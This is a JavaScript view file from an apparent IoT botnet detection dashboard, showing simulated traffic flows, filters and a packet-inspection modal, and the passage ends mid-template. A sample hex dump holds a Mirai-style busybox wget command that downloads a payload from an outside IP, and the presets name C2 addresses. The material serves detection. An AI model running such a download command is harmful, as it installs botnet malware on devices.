/**
 * IoT Botnet Detection System — Live Traffic Monitoring View (traffic.js)
 * Features live packet rate meters, protocol breakdown, anomaly highlighting,
 * DPI payload hex inspector, and external packet collector ingestion interface.
 */

window.TrafficView = {
  isPaused: false,
  filterRisk: "all",
  filterDevice: "all",
  filterProtocol: "all",
  timeWindow: "all", // "1m", "5m", "15m", "all"
  searchQuery: "",

  render(container) {
    container.innerHTML = `
      <!-- Header with Prominent DEMO DATA / SIMULATED TELEMETRY Branding -->
      <div class="card" style="margin-bottom: var(--space-xl); padding: 16px 20px;">
        <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;">
          <div>
            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 4px;">
              <h2 style="font-size: 18px; margin: 0; display: flex; align-items: center; gap: 8px;">
                <span class="pulse-indicator ${this.isPaused ? 'alert' : ''}" id="stream-pulse-dot"></span>
                Live Network Flow Monitor & Packet Collector Stream
              </h2>
              <span class="demo-mode-pill" style="font-size: 11px;">
                DEMO DATA / SIMULATED TELEMETRY
              </span>
            </div>
            <div style="font-size: 12px; color: var(--text-secondary);">
              Continuous telemetry ingestion from synthetic IoT device sensors and virtual TAP interfaces.
            </div>
          </div>

          <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
            <select id="select-demo-scenario" onchange="TrafficView.runDemoScenario(this.value); this.selectedIndex=0;"
                    style="background: var(--bg-surface); color: var(--highlight-mint); border: 1px solid var(--border-subtle); padding: 5px 8px; border-radius: var(--radius-sm); font-size: 12px; font-weight: 600;">
              <option value="" disabled selected>⚡ Inject Demo Scenario...</option>
              <option value="normal_home">1. Normal Household Activity (Safe)</option>
              <option value="repeated_connections">2. Repeated Connections (Brute Force)</option>
              <option value="unusually_high_traffic">3. Unusually High Traffic (SYN Flood)</option>
              <option value="suspicious_destinations">4. Suspicious Destination Diversity (Port Sweep)</option>
            </select>
            <button class="btn btn-secondary btn-sm" id="btn-ingest-flow" onclick="TrafficView.openIngestModal()" style="display: flex; align-items: center; gap: 6px;">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              Ingest External Flow / PCAP
            </button>
            <button class="btn ${this.isPaused ? 'btn-primary' : 'btn-secondary'} btn-sm" id="btn-toggle-stream" onclick="TrafficView.togglePause()" style="min-width: 120px;">
              ${this.isPaused ? '▶ Resume Stream' : '⏸ Pause Stream'}
            </button>
            <button class="btn btn-secondary btn-sm" onclick="TrafficView.clearFlows()" title="Clear buffered flow log">
              Clear Buffer
            </button>
          </div>
        </div>
      </div>

      <!-- Live Stream Metrics & Throughput Banner -->
      <div class="traffic-stats-strip">
        <div class="traffic-metric-tile">
          <span class="traffic-metric-label">Active Flow Buffer</span>
          <span class="traffic-metric-val" id="metric-active-flows" style="color: var(--highlight-mint);">0</span>
          <span style="font-size: 11px; color: var(--text-muted); margin-top: 2px;">In-memory circular buffer</span>
        </div>
        <div class="traffic-metric-tile">
          <span class="traffic-metric-label">Inbound / Outbound PPS</span>
          <span class="traffic-metric-val" id="metric-flow-pps">0.0 pps</span>
          <span style="font-size: 11px; color: var(--text-muted); margin-top: 2px;" id="metric-flow-split">In: 48% · Out: 52%</span>
        </div>
        <div class="traffic-metric-tile">
          <span class="traffic-metric-label">Live Throughput</span>
          <span class="traffic-metric-val" id="metric-flow-bytes" style="color: var(--highlight-mint);">0.0 KB/s</span>
          <span style="font-size: 11px; color: var(--text-muted); margin-top: 2px;">Extracted payload rate</span>
        </div>
        <div class="traffic-metric-tile">
          <span class="traffic-metric-label">Threat Verdict Distribution</span>
          <div style="display: flex; gap: 6px; align-items: center; margin-top: 4px;">
            <span class="badge badge-normal" id="metric-count-normal">0 Safe</span>
            <span class="badge badge-suspicious" id="metric-count-susp">0 Susp</span>
            <span class="badge badge-high-risk" id="metric-count-danger">0 Alert</span>
          </div>
        </div>
      </div>

      <!-- Controls & Multi-Parameter Filter Bar -->
      <div class="card" style="margin-bottom: var(--space-xl); padding: 14px 20px;">
        <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;">
          <!-- Left: Stream Cadence & Filters -->
          <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
            <!-- Cadence -->
            <div style="display: flex; align-items: center; gap: 6px;">
              <span style="font-size: 11px; text-transform: uppercase; color: var(--text-muted);">Cadence:</span>
              <select id="select-stream-cadence" onchange="App.setStreamInterval(this.value)"
                      style="background: var(--bg-surface); color: var(--text-main); border: 1px solid var(--border-subtle); padding: 5px 8px; border-radius: var(--radius-sm); font-size: 12px;">
                <option value="500">500 ms (Fast)</option>
                <option value="1000" selected>1.0 s (Normal)</option>
                <option value="2000">2.0 s (Slow)</option>
              </select>
            </div>

            <!-- Time Window Selector -->
            <div style="display: flex; align-items: center; gap: 6px;">
              <span style="font-size: 11px; text-transform: uppercase; color: var(--text-muted);">Window:</span>
              <select id="select-time-window" onchange="TrafficView.setTimeWindow(this.value)"
                      style="background: var(--bg-surface); color: var(--text-main); border: 1px solid var(--border-subtle); padding: 5px 8px; border-radius: var(--radius-sm); font-size: 12px;">
                <option value="all" selected>All Buffered</option>
                <option value="1m">Last 1 Minute</option>
                <option value="5m">Last 5 Minutes</option>
                <option value="15m">Last 15 Minutes</option>
              </select>
            </div>

            <!-- Verdict Filter -->
            <div style="display: flex; align-items: center; gap: 6px;">
              <span style="font-size: 11px; text-transform: uppercase; color: var(--text-muted);">Verdict:</span>
              <select id="select-risk-filter" onchange="TrafficView.setRiskFilter(this.value)"
                      style="background: var(--bg-surface); color: var(--text-main); border: 1px solid var(--border-subtle); padding: 5px 8px; border-radius: var(--radius-sm); font-size: 12px;">
                <option value="all">All Verdicts</option>
                <option value="Normal">Normal Only</option>
                <option value="Suspicious">Suspicious Only</option>
                <option value="High-Risk">High-Risk Only</option>
              </select>
            </div>

            <!-- Device Filter -->
            <div style="display: flex; align-items: center; gap: 6px;">
              <span style="font-size: 11px; text-transform: uppercase; color: var(--text-muted);">Device:</span>
              <select id="select-device-filter" onchange="TrafficView.setDeviceFilter(this.value)"
                      style="background: var(--bg-surface); color: var(--text-main); border: 1px solid var(--border-subtle); padding: 5px 8px; border-radius: var(--radius-sm); font-size: 12px; max-width: 170px;">
                <option value="all">All Devices</option>
                ${(App.state.devices || []).map(d => `<option value="${d.id}">${d.name}</option>`).join("")}
              </select>
            </div>

            <!-- Protocol Filter -->
            <div style="display: flex; align-items: center; gap: 6px;">
              <span style="font-size: 11px; text-transform: uppercase; color: var(--text-muted);">Protocol:</span>
              <select id="select-traffic-protocol" onchange="TrafficView.setProtocolFilter(this.value)"
                      style="background: var(--bg-surface); color: var(--text-main); border: 1px solid var(--border-subtle); padding: 5px 8px; border-radius: var(--radius-sm); font-size: 12px;">
                <option value="all">All Protocols</option>
                <option value="TCP">TCP</option>
                <option value="UDP">UDP</option>
                <option value="MQTT">MQTT</option>
                <option value="RTSP">RTSP</option>
                <option value="TLS">TLS</option>
              </select>
            </div>
          </div>

          <!-- Right: Search Input -->
          <div style="display: flex; align-items: center; gap: 8px;">
            <input type="text" id="traffic-search-input" value="${this.searchQuery}" placeholder="Search IP, port, device, flow ID..." oninput="TrafficView.setSearchQuery(this.value)"
                   style="background: var(--bg-surface); color: var(--text-main); border: 1px solid var(--border-subtle); padding: 6px 12px; border-radius: var(--radius-sm); font-size: 12px; width: 220px;" />
          </div>
        </div>
      </div>

      <!-- Live Flow Inspector Table -->
      <div class="card" style="padding: 0; overflow: hidden; margin-bottom: var(--space-xl);">
        <div class="card-header" style="padding: 16px 20px; border-bottom: 1px solid var(--border-subtle); margin-bottom: 0; display: flex; justify-content: space-between; align-items: center;">
          <div class="card-title">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
            Active Stream Buffer & Feature Vector Timeline
          </div>
          <span style="font-size: 12px; font-family: var(--font-mono); color: var(--text-secondary);">
            Displaying <span id="traffic-displayed-count" style="color: var(--highlight-mint); font-weight: 700;">0</span> flows
          </span>
        </div>

        <div class="table-wrapper" style="border: none; max-height: 600px; overflow-y: auto;">
          <table class="cyber-table">
            <thead>
              <tr>
                <th>Timestamp</th>
                <th>Source Device / IP</th>
                <th>Destination Endpoint</th>
                <th>Protocol</th>
                <th>Packet Rate</th>
                <th>Byte Rate</th>
                <th>Entropy</th>
                <th>Triggered Rule / Signature</th>
                <th>ML Score & Verdict</th>
                <th style="text-align: right;">Action</th>
              </tr>
            </thead>
            <tbody id="traffic-stream-tbody">
              <!-- Dynamically populated -->
            </tbody>
          </table>
        </div>
      </div>

      <!-- Deep Packet Inspection (DPI) & Hex Dump Modal -->
      <div id="flow-dpi-modal" class="modal-backdrop">
        <div class="cyber-modal" id="flow-dpi-content" style="max-width: 740px;">
          <!-- Dynamically populated on Inspect click -->
        </div>
      </div>

      <!-- External Flow Collector Ingestion Modal -->
      <div id="flow-ingest-modal" class="modal-backdrop">
        <div class="cyber-modal" id="flow-ingest-content" style="max-width: 680px;">
          <!-- Dynamically populated -->
        </div>
      </div>
    `;

    this.renderFlows();
  },

  togglePause() {
    this.isPaused = !this.isPaused;
    const btn = document.getElementById("btn-toggle-stream");
    if (btn) {
      btn.textContent = this.isPaused ? "▶ Resume Stream" : "⏸ Pause Stream";
      btn.className = `btn ${this.isPaused ? 'btn-primary' : 'btn-secondary'} btn-sm`;
    }
    const dot = document.getElementById("stream-pulse-dot");
    if (dot) {
      dot.className = `pulse-indicator ${this.isPaused ? 'alert' : ''}`;
    }
    App.showToast(this.isPaused ? "Live telemetry stream paused" : "Live telemetry stream resumed", "info");
  },

  setTimeWindow(val) {
    this.timeWindow = val;
    this.renderFlows();
  },

  setRiskFilter(val) {
    this.filterRisk = val;
    this.renderFlows();
  },

  setDeviceFilter(val) {
    this.filterDevice = val;
    this.renderFlows();
  },

  setProtocolFilter(val) {
    this.filterProtocol = val;
    this.renderFlows();
  },

  setSearchQuery(q) {
    this.searchQuery = q.toLowerCase();
    this.renderFlows();
  },

  clearFlows() {
    App.state.flows = [];
    this.renderFlows();
    App.showToast("Traffic stream buffer cleared", "info");
  },

  getFilteredFlows() {
    let flows = App.state.flows || [];

    // Filter by Verdict
    if (this.filterRisk !== "all") {
      flows = flows.filter(f => (f.status || "").toLowerCase() === this.filterRisk.toLowerCase());
    }

    // Filter by Device
    if (this.filterDevice !== "all") {
      flows = flows.filter(f => f.device_id === this.filterDevice);
    }

    // Filter by Protocol
    if (this.filterProtocol !== "all") {
      flows = flows.filter(f => (f.protocol || "").toUpperCase() === this.filterProtocol.toUpperCase());
    }

    // Filter by Search Query
    if (this.searchQuery) {
      const q = this.searchQuery;
      flows = flows.filter(f =>
        (f.device_name && f.device_name.toLowerCase().includes(q)) ||
        (f.source_ip && f.source_ip.toLowerCase().includes(q)) ||
        (f.dest_ip && f.dest_ip.toLowerCase().includes(q)) ||
        (f.dest_port && f.dest_port.toString().includes(q)) ||
        (f.protocol && f.protocol.toLowerCase().includes(q)) ||
        (f.flow_id && f.flow_id.toLowerCase().includes(q))
      );
    }

    return flows;
  },

  renderFlows() {
    const rawFlows = App.state.flows || [];
    const filteredFlows = this.getFilteredFlows();

    // Update Stream Metrics Banner
    const activeEl = document.getElementById("metric-active-flows");
    if (activeEl) activeEl.textContent = rawFlows.length;

    const countNorm = rawFlows.filter(f => f.status === "Normal").length;
    const countSusp = rawFlows.filter(f => f.status === "Suspicious").length;
    const countDang = rawFlows.filter(f => f.status === "High-Risk").length;

    const elNorm = document.getElementById("metric-count-normal");
    const elSusp = document.getElementById("metric-count-susp");
    const elDang = document.getElementById("metric-count-danger");
    if (elNorm) elNorm.textContent = `${countNorm} Normal`;
    if (elSusp) elSusp.textContent = `${countSusp} Susp`;
    if (elDang) elDang.textContent = `${countDang} High-Risk`;

    if (rawFlows.length > 0) {
      const latestFlow = rawFlows[0];
      const pps = latestFlow.raw_features ? latestFlow.raw_features.packet_rate : (latestFlow.packet_rate || 0);
      const bps = latestFlow.raw_features ? latestFlow.raw_features.byte_rate : (latestFlow.byte_rate || 0);

      const ppsEl = document.getElementById("metric-flow-pps");
      if (ppsEl) ppsEl.textContent = `${pps.toFixed(1)} pps`;

      const bytesEl = document.getElementById("metric-flow-bytes");
      if (bytesEl) bytesEl.textContent = `${(bps / 1024).toFixed(1)} KB/s`;
    }

    const countEl = document.getElementById("traffic-displayed-count");
    if (countEl) countEl.textContent = filteredFlows.length;

    const tbody = document.getElementById("traffic-stream-tbody");
    if (!tbody) return;

    if (filteredFlows.length === 0) {
      tbody.innerHTML = `
        <tr>
          <td colspan="10" style="text-align: center; color: var(--text-muted); padding: 48px;">
            No network flows matching current filter criteria.
          </td>
        </tr>
      `;
      return;
    }

    tbody.innerHTML = filteredFlows.map(f => {
      const isHigh = f.status === "High-Risk";
      const isSusp = f.status === "Suspicious";
      const rowClass = isHigh ? "row-high-risk" : (isSusp ? "row-suspicious" : "");
      const badgeClass = isHigh ? "badge-high-risk" : (isSusp ? "badge-suspicious" : "badge-normal");
      const riskScore = f.ml_prediction ? Math.round(f.ml_prediction.risk_score * 100) : (isHigh ? 95 : (isSusp ? 58 : 4));
      const topRule = (f.rule_matches && f.rule_matches.length > 0) ? f.rule_matches[0] : null;

      // Port tag styling
      let portTag = "";
      if (f.dest_port === 23 || f.dest_port === 2323) portTag = '<span style="font-size: 10px; color: var(--state-danger); font-family: var(--font-mono); margin-left: 4px;">[Telnet]</span>';
      else if (f.dest_port === 80 || f.dest_port === 8080) portTag = '<span style="font-size: 10px; color: var(--highlight-mint); font-family: var(--font-mono); margin-left: 4px;">[HTTP]</span>';
      else if (f.dest_port === 443) portTag = '<span style="font-size: 10px; color: var(--highlight-mint); font-family: var(--font-mono); margin-left: 4px;">[HTTPS]</span>';
      else if (f.dest_port === 1883) portTag = '<span style="font-size: 10px; color: var(--text-secondary); font-family: var(--font-mono); margin-left: 4px;">[MQTT]</span>';
      else if (f.dest_port === 502) portTag = '<span style="font-size: 10px; color: var(--state-warning); font-family: var(--font-mono); margin-left: 4px;">[Modbus]</span>';

      // Data source provenance tag
      const isDemoFlow = Boolean(f.is_demo || f.data_source === "demo_scenario");
      const sourceTag = isDemoFlow ?
        '<span class="badge" style="background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); font-size: 9px; padding: 1px 4px; border-radius: 3px;">DEMO</span>' :
        '<span class="badge" style="background: rgba(34, 197, 94, 0.15); color: #22c55e; border: 1px solid rgba(34, 197, 94, 0.3); font-size: 9px; padding: 1px 4px; border-radius: 3px;">COLLECTOR</span>';

      return `
        <tr class="${rowClass}">
          <td style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); white-space: nowrap;">
            ${f.timestamp}
            <div style="margin-top: 3px;">${sourceTag}</div>
          </td>
          <td>
            <div style="font-weight: 600; font-size: 13px; color: var(--text-main);">${f.device_name}</div>
            <div style="display: flex; align-items: center; gap: 4px; margin-top: 2px;">
              <span class="ip-chip">${f.source_ip}</span>
              <span style="font-size: 10px; font-family: var(--font-mono); color: var(--text-muted);">${f.device_id}</span>
            </div>
          </td>
          <td>
            <span class="ip-chip">${f.dest_ip}:${f.dest_port}</span>${portTag}
          </td>
          <td>
            <span class="badge ${f.protocol === 'TCP' ? 'badge-safe' : 'badge-normal'}" style="font-size: 10px;">${f.protocol}</span>
          </td>
          <td style="font-family: var(--font-mono); font-weight: 700; color: ${isHigh ? 'var(--state-danger)' : 'var(--text-main)'};">
            ${f.raw_features ? f.raw_features.packet_rate.toFixed(1) : (f.packet_rate || 0).toFixed(1)} <span style="font-size: 10px; color: var(--text-muted); font-weight: normal;">pps</span>
          </td>
          <td style="font-family: var(--font-mono); font-size: 12px; color: var(--text-secondary);">
            ${f.raw_features ? (f.raw_features.byte_rate / 1024).toFixed(1) : ((f.byte_rate || 0) / 1024).toFixed(1)} KB/s
          </td>
          <td style="font-family: var(--font-mono); font-size: 12px; color: ${f.raw_features && f.raw_features.payload_entropy > 7.0 ? 'var(--state-danger)' : 'var(--text-main)'};">
            ${f.raw_features ? f.raw_features.payload_entropy.toFixed(2) : ((f.payload_entropy || 4.2)).toFixed(2)}
          </td>
          <td>
            ${topRule ? `
              <span class="badge ${isHigh ? 'badge-high-risk' : 'badge-suspicious'}" style="font-size: 10px;" title="${topRule.reason}">
                [${topRule.rule_id}] ${topRule.name}
              </span>
            ` : `
              <span style="font-size: 11px; color: var(--highlight-mint);">✓ Rule Check Passed</span>
            `}
          </td>
          <td>
            <div style="display: flex; align-items: center; gap: 6px;">
              <span class="badge ${badgeClass}">${f.status}</span>
              <span style="font-family: var(--font-mono); font-size: 11px; color: var(--text-secondary);">${riskScore}%</span>
            </div>
          </td>
          <td style="text-align: right;">
            <button class="btn btn-secondary btn-sm" onclick="TrafficView.openInspection('${f.flow_id || f.id}')">
              Inspect
            </button>
          </td>
        </tr>
      `;
    }).join("");
  },

  openInspection(flowId) {
    const flow = (App.state.flows || []).find(f => (f.flow_id === flowId || f.id === flowId));
    if (!flow) return;

    const modal = document.getElementById("flow-dpi-modal");
    const container = document.getElementById("flow-dpi-content");
    if (!modal || !container) return;

    const ml = flow.ml_prediction || {};
    const rules = flow.rule_matches || [];
    const isHigh = flow.status === "High-Risk";
    const feat = flow.raw_features || {};

    // Generate realistic simulated Hex Dump
    let sampleHex = "";
    if (flow.dest_port === 23 || isHigh) {
      sampleHex = `0000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|\n0010  02 00 08 00 01 00 00 00  54 80 04 08 34 00 00 00  |........T...4...|\n0020  73 68 65 6c 6c 20 2d 63  20 22 2f 62 69 6e 2f 62  |shell -c "/bin/b|\n0030  75 73 79 62 6f 78 20 57  47 45 54 20 68 74 74 70  |usybox WGET http|\n0040  3a 2f 2f 31 38 35 2e 31  39 33 2e 36 34 2e 31 32  |://185.193.64.12|\n0050  2f 6d 69 72 61 69 2e 61  72 6d 22 00 00 00 00 00  |/mirai.arm".....|`;
    } else if (flow.protocol === "MQTT") {
      sampleHex = `0000  30 2b 00 12 73 65 6e 73  6f 72 2f 74 65 6d 70 65  |0+..sensor/tempe|\n0010  72 61 74 75 72 65 7b 22  76 61 6c 75 65 22 3a 37  |rature{"value":7|\n0020  32 2e 34 2c 22 75 6e 69  74 22 3a 22 46 22 7d 00  |2.4,"unit":"F"}.|`;
    } else {
      sampleHex = `0000  47 45 54 20 2f 61 70 69  2f 73 74 61 74 75 73 20  |GET /api/status |\n0010  48 54 54 50 2f 31 2e 31  0d 0a 48 6f 73 74 3a 20  |HTTP/1.1..Host: |\n0020  69 6f 74 2d 67 61 74 65  77 61 79 2e 6c 6f 63 61  |iot-gateway.loca|\n0030  6c 0d 0a 55 73 65 72 2d  41 67 65 6e 74 3a 20 4e  |l..User-Agent: N|`;
    }

    container.innerHTML = `
      <div class="modal-header">
        <div>
          <h2 style="font-size: 18px; display: flex; align-items: center; gap: 8px;">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
            Deep Packet Inspection & Flow Feature Attribution
          </h2>
          <span style="font-size: 12px; font-family: var(--font-mono); color: var(--highlight-mint);">${flow.flow_id || flow.id} · Recorded ${flow.timestamp}</span>
        </div>
        <button class="close-btn" onclick="TrafficView.closeInspection()">×</button>
      </div>

      <!-- Flow 5-Tuple Matrix -->
      <div class="grid-2" style="margin-bottom: var(--space-md); gap: 12px;">
        <div style="background: var(--bg-surface); padding: 12px 16px; border-radius: var(--radius-md); border: 1px solid var(--border-subtle);">
          <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 4px;">Source Asset</div>
          <div style="font-weight: 600; color: var(--text-main);">${flow.device_name}</div>
          <div style="font-family: var(--font-mono); font-size: 12px; color: var(--highlight-mint);">${flow.source_ip} (ID: ${flow.device_id})</div>
        </div>
        <div style="background: var(--bg-surface); padding: 12px 16px; border-radius: var(--radius-md); border: 1px solid var(--border-subtle);">
          <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 4px;">Target Endpoint</div>
          <div style="font-weight: 600; color: var(--text-main); font-family: var(--font-mono);">${flow.dest_ip}:${flow.dest_port}</div>
          <div style="font-size: 12px; color: var(--text-secondary);">${flow.protocol} Protocol · External WAN Dest</div>
        </div>
      </div>

      <!-- Extracted Feature Vector Attributes -->
      <div style="margin-bottom: var(--space-md);">
        <h4 style="margin-bottom: 8px; font-size: 13px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em;">Extracted Flow Vector Attributes:</h4>
        <div class="grid-3" style="gap: 8px;">
          <div style="background: var(--bg-card); padding: 8px 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle);">
            <div style="font-size: 10px; color: var(--text-muted);">PACKET RATE</div>
            <div style="font-family: var(--font-mono); font-weight: 700; color: ${isHigh ? 'var(--state-danger)' : 'var(--text-main)'};">
              ${(feat.packet_rate || flow.packet_rate || 0).toFixed(1)} pps
            </div>
          </div>
          <div style="background: var(--bg-card); padding: 8px 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle);">
            <div style="font-size: 10px; color: var(--text-muted);">BYTE RATE</div>
            <div style="font-family: var(--font-mono); font-weight: 700; color: var(--text-main);">
              ${((feat.byte_rate || flow.byte_rate || 0) / 1024).toFixed(1)} KB/s
            </div>
          </div>
          <div style="background: var(--bg-card); padding: 8px 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle);">
            <div style="font-size: 10px; color: var(--text-muted);">CONN FREQUENCY</div>
            <div style="font-family: var(--font-mono); font-weight: 700; color: var(--text-main);">
              ${(feat.conn_freq || flow.conn_freq || 1.2).toFixed(1)} conn/10s
            </div>
          </div>
          <div style="background: var(--bg-card); padding: 8px 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle);">
            <div style="font-size: 10px; color: var(--text-muted);">SYN PACKET RATIO</div>
            <div style="font-family: var(--font-mono); font-weight: 700; color: ${feat.syn_ratio > 0.8 ? 'var(--state-danger)' : 'var(--text-main)'};">
              ${(feat.syn_ratio || 0.05).toFixed(2)}
            </div>
          </div>
          <div style="background: var(--bg-card); padding: 8px 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle);">
            <div style="font-size: 10px; color: var(--text-muted);">PAYLOAD ENTROPY</div>
            <div style="font-family: var(--font-mono); font-weight: 700; color: ${feat.payload_entropy > 7.0 ? 'var(--state-danger)' : 'var(--text-main)'};">
              ${(feat.payload_entropy || flow.payload_entropy || 4.2).toFixed(2)} / 8.0
            </div>
          </div>
          <div style="background: var(--bg-card); padding: 8px 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle);">
            <div style="font-size: 10px; color: var(--text-muted);">FLOW DURATION</div>
            <div style="font-family: var(--font-mono); font-weight: 700; color: var(--text-main);">
              ${(feat.flow_duration || flow.flow_duration || 1.5).toFixed(2)}s
            </div>
          </div>
        </div>
      </div>

      <!-- Heuristic Rule Engine Evaluation -->
      <div style="margin-bottom: var(--space-md);">
        <h4 style="margin-bottom: 8px; font-size: 13px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em;">Heuristic Rule Engine Evaluation:</h4>
        ${rules.length === 0 ? `
          <div style="font-size: 12px; color: var(--highlight-mint); background: rgba(34, 197, 94, 0.08); padding: 10px 14px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle);">
            ✓ All heuristic rule checks satisfied. No anomalous patterns matched.
          </div>
        ` : `
          <div style="display: flex; flex-direction: column; gap: 6px;">
            ${rules.map(r => `
              <div style="background: var(--state-danger-bg); border: 1px solid var(--state-danger-border); padding: 10px 14px; border-radius: var(--radius-sm);">
                <div style="display: flex; justify-content: space-between; margin-bottom: 2px;">
                  <strong style="color: var(--state-danger); font-size: 12px;">[${r.rule_id}] ${r.name}</strong>
                  <span class="badge badge-high-risk">${r.severity}</span>
                </div>
                <div style="font-size: 11px; color: var(--text-main);">${r.reason}</div>
              </div>
            `).join("")}
          </div>
        `}
      </div>

      <!-- Deep Packet Inspection (DPI) Raw Payload Hex Dump -->
      <div style="margin-bottom: var(--space-md);">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
          <h4 style="font-size: 13px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em; margin: 0;">
            Payload Hex & ASCII Inspection Dump
          </h4>
          <span style="font-size: 11px; font-family: var(--font-mono); color: var(--text-muted);">Decoded TAP Buffer (Offset 0x00)</span>
        </div>
        <div class="hex-dump-container">
          <pre style="margin: 0; white-space: pre-wrap; font-family: var(--font-mono); font-size: 11px;">${sampleHex}</pre>
        </div>
      </div>

      <!-- ML Model Verdict & Contributions -->
      <div style="margin-bottom: var(--space-lg);">
        <h4 style="margin-bottom: 8px; font-size: 13px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em;">Machine Learning Attribution:</h4>
        <div class="prediction-box">
          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
            <span style="font-weight: 600;">Prediction: <span class="badge ${isHigh ? 'badge-high-risk' : (flow.status === 'Suspicious' ? 'badge-suspicious' : 'badge-normal')}">${flow.status}</span></span>
            <span style="font-family: var(--font-mono); font-size: 12px; color: var(--highlight-mint);">Confidence: ${ml.probabilities ? Math.round(Math.max(...Object.values(ml.probabilities)) * 100) : 95}%</span>
          </div>

          ${ml.contributing_features ? `
            <div style="display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px;">
              ${ml.contributing_features.map(f => `
                <span class="badge ${f.direction === 'danger' ? 'badge-high-risk' : (f.direction === 'warning' ? 'badge-suspicious' : 'badge-normal')}" style="font-size: 10px;">
                  ${f.feature}: ${f.value} (${f.impact})
                </span>
              `).join("")}
            </div>
          ` : ''}
        </div>
      </div>

      <!-- Action Buttons -->
      <div style="display: flex; justify-content: flex-end; gap: 10px;">
        <button class="btn btn-secondary" onclick="TrafficView.closeInspection()">Close</button>
        ${isHigh ? `
          <button class="btn btn-danger" onclick="App.quarantineDevice('${flow.device_id}', true); TrafficView.closeInspection();">
            Isolate Source Endpoint (${flow.device_name})
          </button>
        ` : ''}
      </div>
    `;

    modal.classList.add("open");
  },

  closeInspection() {
    const modal = document.getElementById("flow-dpi-modal");
    if (modal) modal.classList.remove("open");
  },

  openIngestModal() {
    const modal = document.getElementById("flow-ingest-modal");
    const container = document.getElementById("flow-ingest-content");
    if (!modal || !container) return;

    const samplePresets = {
      mirai: {
        device_id: "DEV-101",
        source_ip: "192.168.1.101",
        dest_ip: "185.193.64.12",
        dest_port: 23,
        protocol: "TCP",
        packet_rate: 520.0,
        byte_rate: 66560,
        conn_freq: 28.5,
        syn_ratio: 0.94,
        payload_entropy: 7.35,
        flow_duration: 0.8,
        collector_source: "Zeek Mirai Telnet Incursion Probe"
      },
      synflood: {
        device_id: "DEV-107",
        source_ip: "192.168.1.107",
        dest_ip: "185.193.64.12",
        dest_port: 80,
        protocol: "TCP",
        packet_rate: 780.0,
        byte_rate: 49920,
        conn_freq: 55.0,
        syn_ratio: 0.98,
        payload_entropy: 3.8,
        flow_duration: 0.05,
        collector_source: "NetFlow v9 DoS Telemetry"
      },
      c2beacon: {
        device_id: "DEV-105",
        source_ip: "192.168.1.105",
        dest_ip: "45.142.213.9",
        dest_port: 4444,
        protocol: "TCP",
        packet_rate: 22.0,
        byte_rate: 15400,
        conn_freq: 14.0,
        syn_ratio: 0.12,
        payload_entropy: 7.85,
        flow_duration: 3.5,
        collector_source: "Suricata C2 Heartbeat Sensor"
      },
      benign: {
        device_id: "DEV-103",
        source_ip: "192.168.1.103",
        dest_ip: "34.117.59.81",
        dest_port: 1883,
        protocol: "MQTT",
        packet_rate: 2.4,
        byte_rate: 850,
        conn_freq: 0.8,
        syn_ratio: 0.02,
        payload_entropy: 4.1,
        flow_duration: 15.0,
        collector_source: "IoT Edge Telemetry Agent"
      }
    };

    container.innerHTML = `
      <div class="modal-header">
        <div>
          <h2 style="font-size: 18px; display: flex; align-items: center; gap: 8px;">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            External Packet Collector Ingestion Interface
          </h2>
          <span style="font-size: 12px; color: var(--text-secondary);">Ingest real PCAP summary or NetFlow JSON vectors into live detection pipeline</span>
        </div>
        <button class="close-btn" onclick="TrafficView.closeIngestModal()">×</button>
      </div>

      <div style="margin-bottom: 14px;">
        <label style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); display: block; margin-bottom: 6px;">Select Collector Telemetry Preset:</label>
        <select id="select-ingest-preset" onchange="TrafficView.loadIngestPreset(this.value)"
                style="background: var(--bg-surface); color: var(--text-main); border: 1px solid var(--border-subtle); padding: 7px 12px; border-radius: var(--radius-sm); font-size: 12px; width: 100%;">
          <option value="mirai">Preset 1: Zeek Mirai Telnet Incursion (Port 23 Scan)</option>
          <option value="synflood">Preset 2: NetFlow v9 Volumetric TCP SYN Flood</option>
          <option value="c2beacon">Preset 3: Suricata C2 Heartbeat Beacon (Gafgyt)</option>
          <option value="benign">Preset 4: Benign Ecobee Thermostat MQTT Telemetry</option>
        </select>
      </div>

      <div style="margin-bottom: 16px;">
